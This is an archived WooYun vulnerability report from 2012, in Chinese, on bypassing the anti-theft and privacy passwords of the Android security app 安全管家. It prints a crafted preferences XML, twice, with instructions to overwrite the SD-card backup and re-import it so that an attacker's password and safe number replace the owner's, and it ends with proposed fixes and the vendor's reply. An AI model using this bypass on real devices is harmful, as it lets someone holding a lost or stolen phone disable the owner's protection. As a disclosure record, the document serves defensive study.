{"id": 20723, "wybug_id": "wooyun-2012-04953", "wybug_title": "另类方法绕过安全管家的防盗密码（无需root）", "wybug_corp": "安全管家", "wybug_author": "Jian(64bit)", "wybug_date": "2012-03-01 21:47", "wybug_open_date": "2012-04-15 21:48", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-03-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-03-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2012-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-04-15：\t细节向公众公开  简要描述： 前段时间发现了安全管家的的防盗密码 安全手机号码 隐私密码都是明文存储在/data下的某个文件夹的配置文件里。提交至wooyun后迅速修复，只是做了复杂的加密。发布了新的版本。今天我就用另类方法进行绕过安全管家的密码。直接修改安全管家的的防盗密码 安全手机号码 隐私密码。 详细说明：  在安全管家里进行配置文件导出，然后找到存储在sd卡上的配置文件。打开后配置文件都已经加密了。无从下手，将下面code\n<?xml version='1.0' encoding='utf-8' standalone='yes' ?><map><boolean name=\"user_wifi_protect\" value=\"true\" /><long name=\"last_screen_off_time\" value=\"XXXXXXXXXXXXXXXX\" /><long name=\"plan_update_time\" value=\"14160000\" /><int name=\"cloud_scan\" value=\"1\" /><boolean name=\"update_flag\" value=\"true\" /><boolean name=\"auto_start\" value=\"true\" /><string name=\"burglarkavass_mobile\">安全号码</string><boolean name=\"netaction_info\" value=\"false\" /><int name=\"heath_check_score\" value=\"100\" /><boolean name=\"first_plan_update_day_flag\" value=\"true\" /><boolean name=\"plan_update_place_flag\" value=\"false\" /><boolean name=\"plan_wifi_update_flag\" value=\"false\" /><long name=\"last_check_time\" value=\"XXXXXXXXXXXXXXXX\" /><boolean name=\"Notification_control\" value=\"false\" /><string name=\"update_notify\">20120210</string><boolean name=\"firstappview\" value=\"true\" /><string name=\"backup_password\"></string><long name=\"ConnectionChange\" value=\"××××××××××××\" /><boolean name=\"last_version_flag\" value=\"true\" /><long name=\"heath_check_time\" value=\"××××××××××××\" /><boolean name=\"service_status\" value=\"true\" /><int name=\"screen_size\" value=\"1\" /><string name=\"app_update_style1\">0</string><string name=\"lastenter_date\">20120210</string><boolean name=\"check_cancel_flag\" value=\"false\" /><int name=\"plan_update_count\" value=\"1\" /><boolean name=\"pickproof\" value=\"true\" /><boolean name=\"first_plan_update_flag\" value=\"false\" /><string name=\"burglarkavass_smstext\">XXXXXXXXXXXX</string><string name=\"vip_pwd\">防盗密码</string><boolean name=\"auto_cloud_scan\" value=\"true\" /><boolean name=\"update_bg_ontime\" value=\"true\" /><boolean name=\"call_area_show\" value=\"true\" /><boolean name=\"monitor_install\" value=\"true\" /><boolean name=\"install_new\" value=\"true\" /><string name=\"burglarkavass_pwd\">防盗密码</string><boolean name=\"save_last_screen_off_time\" value=\"true\" /><string name=\"sinaweibo_pass\"></string><boolean name=\"plan_update_flag\" value=\"true\" /><string name=\"start_time\">86.62</string><long name=\"set_net_clear_time\" value=\"××××××××××××\" /><string name=\"imsi\">460028543484430</string><boolean name=\"burglarkavass_guide_flag\" value=\"true\" /><int name=\"vercode\" value=\"57\" /><int name=\"week\" value=\"-2\" /></map>\n保存为com.anguanjia.safe_preferences.xml（上面的防盗密码 安全手机号码都是自己可以随意设置的）覆盖sd卡上备份目录下的 同名文件。进入软件，选择配置文件导入。再次进入软件 防盗密码 安全手机号码等已经都是自己刚刚在软件里面设置的了。至此原始设置的都已失效。   漏洞证明：  在安全管家里进行配置文件导出，然后找到存储在sd卡上的配置文件。打开后配置文件都已经加密了。无从下手，将下面code\n<?xml version='1.0' encoding='utf-8' standalone='yes' ?><map><boolean name=\"user_wifi_protect\" value=\"true\" /><long name=\"last_screen_off_time\" value=\"XXXXXXXXXXXXXXXX\" /><long name=\"plan_update_time\" value=\"14160000\" /><int name=\"cloud_scan\" value=\"1\" /><boolean name=\"update_flag\" value=\"true\" /><boolean name=\"auto_start\" value=\"true\" /><string name=\"burglarkavass_mobile\">安全号码</string><boolean name=\"netaction_info\" value=\"false\" /><int name=\"heath_check_score\" value=\"100\" /><boolean name=\"first_plan_update_day_flag\" value=\"true\" /><boolean name=\"plan_update_place_flag\" value=\"false\" /><boolean name=\"plan_wifi_update_flag\" value=\"false\" /><long name=\"last_check_time\" value=\"XXXXXXXXXXXXXXXX\" /><boolean name=\"Notification_control\" value=\"false\" /><string name=\"update_notify\">20120210</string><boolean name=\"firstappview\" value=\"true\" /><string name=\"backup_password\"></string><long name=\"ConnectionChange\" value=\"××××××××××××\" /><boolean name=\"last_version_flag\" value=\"true\" /><long name=\"heath_check_time\" value=\"××××××××××××\" /><boolean name=\"service_status\" value=\"true\" /><int name=\"screen_size\" value=\"1\" /><string name=\"app_update_style1\">0</string><string name=\"lastenter_date\">20120210</string><boolean name=\"check_cancel_flag\" value=\"false\" /><int name=\"plan_update_count\" value=\"1\" /><boolean name=\"pickproof\" value=\"true\" /><boolean name=\"first_plan_update_flag\" value=\"false\" /><string name=\"burglarkavass_smstext\">XXXXXXXXXXXX</string><string name=\"vip_pwd\">防盗密码</string><boolean name=\"auto_cloud_scan\" value=\"true\" /><boolean name=\"update_bg_ontime\" value=\"true\" /><boolean name=\"call_area_show\" value=\"true\" /><boolean name=\"monitor_install\" value=\"true\" /><boolean name=\"install_new\" value=\"true\" /><string name=\"burglarkavass_pwd\">防盗密码</string><boolean name=\"save_last_screen_off_time\" value=\"true\" /><string name=\"sinaweibo_pass\"></string><boolean name=\"plan_update_flag\" value=\"true\" /><string name=\"start_time\">86.62</string><long name=\"set_net_clear_time\" value=\"××××××××××××\" /><string name=\"imsi\">460028543484430</string><boolean name=\"burglarkavass_guide_flag\" value=\"true\" /><int name=\"vercode\" value=\"57\" /><int name=\"week\" value=\"-2\" /></map>\n保存为com.anguanjia.safe_preferences.xml（上面的防盗密码 安全手机号码都是自己可以随意设置的）覆盖sd卡上备份目录下的 同名文件。进入软件，选择配置文件导入。再次进入软件 防盗密码 安全手机号码等已经都是自己刚刚在软件里面设置的了。至此原始设置的都已失效。   修复方案：  1、去除配置导入导出功能2、增加进入软件的密码3、配置导入导入文件存储格式为*.bak   版权声明：转载请注明来源 Jian(64bit)@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2012-03-02 10:30 厂商回复： 已经开始处理，处理后会再告知，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}